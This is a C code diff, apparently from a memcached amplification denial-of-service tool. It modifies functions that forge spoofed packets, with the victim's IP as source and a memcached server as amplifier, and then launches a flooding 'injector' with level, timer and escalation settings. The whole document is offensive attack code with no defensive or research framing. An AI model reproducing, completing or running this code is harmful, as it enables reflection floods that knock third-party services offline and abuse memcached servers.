@@ -20,7 +20,7 @@ static AttackPlan * createAttackDataGETSET( LhfDraft *p_draft )
 
     memalloc( (void *)&newData, sizeof( AttackPlan ) );
     arg = MEMCACHED_SET;
-    newData->setPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
+    newData->setPacket = ForgeTCP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedBinary, &arg );
     arg = MEMCACHED_GET;
     newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
     newData->draft = p_draft;
@@ -34,7 +34,7 @@ static AttackPlan * createAttackDataSTATS( LhfDraft *p_draft )
 
     memalloc( (void *)&newData, sizeof( AttackPlan ) );
     arg = MEMCACHED_STAT;
-    newData->setPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedBinary, &arg );
+    newData->setPacket = NULL;
     newData->getPacket = ForgeUDP( p_draft->amp_ip, p_draft->target_ip, GetPort(p_draft->amp_port), ForgeMemcachedText, &arg );
     newData->draft = p_draft;
     return newData;
@@ -42,12 +42,18 @@ static AttackPlan * createAttackDataSTATS( LhfDraft *p_draft )
 
 void executeAttack( AttackPlan * atkData )
 {
-    int sock = CreateSocket(RAW, BLOCK);
+    int sock = CreateSocket(TCP, BLOCK);
     char *fileName = (atkData->draft->logfile[0] == '\0') ? NULL : atkData->draft->logfile;
-    if( SendPacket(sock, atkData->setPacket) < 0 )
+   
+    ConnectTCP(sock, atkData->setPacket);
+    for(Packet *tmpPkt = atkData->setPacket; tmpPkt != NULL; tmpPkt = tmpPkt->next)
     {
-        Efatal(ERROR_MEMCACHED, "error memcached\n");
+        if( SendPacket(sock, tmpPkt) < 0 )
+        {
+            Efatal(ERROR_MEMCACHED, "error memcached\n");
+        }
     }
+
     CloseSocket(sock);
     StartNetunoInjector( atkData->getPacket, atkData->draft->level, atkData->draft->timer, atkData->draft->incAttack, fileName);
 }
